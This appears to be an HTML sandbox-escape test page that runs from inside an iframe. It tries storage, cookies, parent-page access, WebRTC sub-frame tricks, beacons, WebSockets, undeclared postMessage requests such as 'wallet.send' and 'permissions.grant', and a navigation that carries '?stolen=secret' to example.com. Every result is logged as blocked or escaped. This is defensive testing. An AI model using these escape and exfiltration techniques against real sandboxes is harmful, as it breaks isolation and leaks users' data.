<!doctype html>
<meta charset="utf-8">
<title>Escape Test</title>
<style>body{margin:0;padding:8px;font:12px/1.4 ui-monospace,Consolas,monospace;background:#fff;color:#2b2450}.ok{color:#1f8a5b}.bad{color:#c2334d;font-weight:bold}</style>
<div id="out"></div>
<script>
// Each attempt should FAIL. "blocked" = good. "ESCAPED" = the socket has a hole.
var results = [];
function note(name, escaped, detail) {
  results.push({ name: name, escaped: escaped, detail: String(detail || '').slice(0, 80) });
  var d = document.createElement('div');
  d.className = escaped ? 'bad' : 'ok';
  d.textContent = (escaped ? 'ESCAPED  ' : 'blocked  ') + name + (detail ? '  (' + String(detail).slice(0, 60) + ')' : '');
  document.getElementById('out').appendChild(d);
}
function tryIt(name, fn) { try { var r = fn(); note(name, r === true, r === true ? 'worked' : r); } catch (e) { note(name, false, e.name); } }

tryIt('read host page (parent.document)', function () { return !!parent.document.body; });
tryIt('read top page (top.location.href)', function () { return typeof top.location.href === 'string'; });
tryIt('localStorage', function () { localStorage.setItem('x', '1'); return true; });
tryIt('sessionStorage', function () { sessionStorage.setItem('x', '1'); return true; });
tryIt('cookies', function () { document.cookie = 'a=1'; return document.cookie.indexOf('a=1') >= 0; });
tryIt('indexedDB', function () { indexedDB.open('x'); return true; });
tryIt('open a popup', function () { return !!window.open('about:blank'); });
tryIt('insert remote script (CSP)', function () {
  var s = document.createElement('script'); s.src = 'https://example.com/x.js';
  s.onload = function () { note('remote script loaded', true); };
  document.head.appendChild(s); return 'inserted, waiting (a later ESCAPED line would mean it loaded)';
});
tryIt('eval (CSP)', function () { return eval('1+1') === 2; });
// Phase 6: the two holes CSP doesn't cover.
tryIt('WebRTC peer connection', function () { return typeof new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.example.com' }] }) === 'object'; });
tryIt('WebRTC via a fresh sub-frame', function () {
  var f = document.createElement('iframe'); document.body.appendChild(f);
  return typeof new f.contentWindow.RTCPeerConnection() === 'object';
});
tryIt('WebRTC via innerHTML sub-frame', function () {
  var d = document.createElement('div'); d.innerHTML = '<iframe></iframe>'; document.body.appendChild(d);
  var f = d.querySelector('iframe');
  return !!(f && f.contentWindow && typeof new f.contentWindow.RTCPeerConnection() === 'object');
});

var pending = 3;
function done() {
  if (--pending) return;
  // The one allowed channel: a declared event. Then some undeclared ones the gate must refuse.
  parent.postMessage({ topic: 'event.publish', name: 'escape.report', data: results }, '*');
  parent.postMessage({ topic: 'net.fetch', url: 'https://example.com/steal' }, '*');
  parent.postMessage({ topic: 'event.publish', name: 'wallet.send', data: 1 }, '*');
  parent.postMessage({ topic: 'permissions.grant', network: ['*'] }, '*');
  parent.postMessage({ topic: 'storage.set', key: 'k', value: 'v' }, '*');
  parent.postMessage({ topic: 'identity.get' }, '*');
  // Last trick: smuggle data out in a web address by navigating the frame itself.
  // The watchdog should notice the second page load and pull the plug.
  setTimeout(function () { location.href = 'https://example.com/?stolen=' + encodeURIComponent('secret'); }, 300);
}
fetch('https://example.com/').then(function () { note('fetch to internet', true); }, function (e) { note('fetch to internet', false, e.name); }).then(done);
new Promise(function (res) {
  var img = new Image();
  img.onload = function () { note('image beacon', true); res(); };
  img.onerror = function () { note('image beacon', false, 'error'); res(); };
  img.src = 'https://example.com/favicon.ico';
}).then(done);
try {
  var ws = new WebSocket('wss://example.com/');
  ws.onopen = function () { note('websocket', true); done(); };
  ws.onerror = function () { note('websocket', false, 'error'); done(); };
} catch (e) { note('websocket', false, e.name); done(); }
parent.postMessage({ topic: 'plug.ready' }, '*');
</script>
